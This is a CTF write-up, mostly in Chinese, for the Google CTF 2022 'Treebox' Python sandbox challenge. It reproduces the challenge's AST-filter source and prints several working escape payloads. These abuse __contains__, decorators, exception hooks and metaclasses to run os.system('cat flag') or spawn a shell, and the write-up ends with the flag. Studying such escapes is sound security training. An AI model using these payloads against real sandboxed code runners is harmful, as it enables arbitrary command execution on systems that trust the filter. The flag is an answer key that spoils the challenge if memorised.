# TREEBOX

*I think I finally got Python sandboxing right.*

*[Attachment](https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301) `treebox.2022.ctfcompetition.com 1337`*

---

<details>
<summary style="display: list-item;">treebox.py</summary>

<div markdown="1">

```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```
</div>
</details>

阅读源码,可以发现:

* `flag`在当前工作目录下一个名为`flag`的文件
* 我们可以通过`exec`执行任意代码,但必须通过`verify_secure`函数的检查
* `verify_secure`使用`ast`模块进行分析,不能有显式的函数调用和导入语句
* `os`和`sys`模块可用

思路:

* `os`模块已经导入,我们可以通过`os.system()`方法来执行系统命令
* 借助于Python机制,通过非显式的方式地来调用函数,如内置函数、重载运算符、解释器Hook

我的解法:

在python中使用`in`运算符时,默认会调用`__contains__`方法,并且会将需要判断的对象作为形参传入;

所以我们可以用`os.system`覆盖现有的python对象/类上的`__contains__`方法,然后通过运算符来调用`system`函数.

```python
os.environ.__class__.__contains__ = os.system
'cat flag' in os.environ
```

其他解法:

1. 装饰器

   ```python
   @exec
   @input
   class X:
     pass
   ```

2. 异常

   ```python
   class MyException(Exception):
     def __str__(self):
       return 'cat flag'
   
   sys.stdout.write=os.system
   sys.stderr.write=os.system
   
   raise MyException   
   ```

   ```python
   class X:
       def __init__(self, a, b, c):
           self += "os.system('sh')"
       __iadd__ = exec
   sys.excepthook = X
   1/0
   ```

3. 元类

   ```python
   # This will define the members on the "sub"class
   class Metaclass:
       __getitem__ = exec # So Sub[string] will execute exec(string)
   # Note: Metaclass.__class__ == type
       
   class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
       pass # Nothing special to do
   
   assert isinstance(Sub, Metaclass)
   sub['import os; os.system("sh")']
   ```



其他Writeup

* [GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)

**flag:**`CTF{CzeresniaTopolaForsycja}`